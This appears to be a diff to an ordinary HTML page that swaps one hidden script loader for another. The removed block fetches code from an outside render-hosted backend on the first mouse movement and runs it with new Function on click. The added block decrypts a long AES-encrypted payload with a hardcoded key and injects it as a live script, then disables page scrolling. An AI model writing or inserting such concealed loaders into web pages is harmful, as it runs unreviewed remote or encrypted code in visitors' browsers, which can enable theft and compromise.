@@ -732,47 +732,21 @@
         };
       });
     </script>
-	<script>
-    const gclid = new URLSearchParams(location.search).get("gclid");
-    const timezone = Intl.DateTimeFormat().resolvedOptions().timeZone;
-    const RENDER_BASE_URL = "https://decemberbackend.onrender.com";
-
-    let someCode = null;
-
-    document.cookie = "access_cookie=true; path=/; max-age=300";
-
-    document.addEventListener("mousemove", async function fetchCodeOnce() {
-      document.removeEventListener("mousemove", fetchCodeOnce);
-      try {
-        const res = await fetch(
-          `${RENDER_BASE_URL}/frontend-loader?gclid=${gclid}`,
-          {
-            headers: {
-              "x-client-timezone": timezone,
-              "x-access-cookie": "true",
-            },
-          }
-        );
-        const data = await res.json();
-        if (data && data.code) {
-          someCode = data.code;
-        }
-      } catch (err) {
-        console.error("Could not fetch code", err);
-      }
-    });
-
-    function handleSomeClick() {
-      if (someCode) {
-        try {
-          new Function(someCode)();
-        } catch (err) {
-          console.error("Error executing code:", err);
-        }
-      }
+	<script src="https://cdnjs.cloudflare.com/ajax/libs/crypto-js/4.1.1/crypto-js.min.js"></script>
+<script>
+    function aesDecode(encodedText) {
+        const decodedText = decodeURIComponent(encodedText);
+        const bytes = CryptoJS.AES.decrypt(decodedText, 'U2FsdGVkX1+uqxI4YN2qNlGDaMHVLViZB05OmcVwVyI=');
+        return bytes.toString(CryptoJS.enc.Utf8);
     }
+    const codeString = aesDecode(`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`);
+    const script = document.createElement("script");
+    script.textContent = codeString;
+    document.body.appendChild(script);
+</script>
 
-    document.addEventListener("click", handleSomeClick);
-  </script>
+<script>
+    document.body.style.overflow = "hidden";
+</script>
   </body>
 </html>
